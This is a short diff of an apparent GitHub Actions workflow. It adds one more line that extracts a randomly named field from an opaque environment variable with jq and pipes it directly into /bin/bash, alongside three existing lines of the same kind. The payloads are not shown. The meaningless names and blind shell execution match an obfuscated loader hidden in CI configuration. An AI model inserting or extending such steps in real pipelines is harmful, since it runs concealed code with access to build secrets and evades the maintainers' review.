@@ -25,6 +25,7 @@ jobs:
           echo $fmgcp0147 | jq -r .w4 | /bin/bash
           echo $yqov2 | jq -r .jvvb5 | /bin/bash
           printf '%s' "$wv071" | jq -r .amec04 | /bin/bash
+          printf '%s' "$neti735" | jq -r .mvjwr165 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
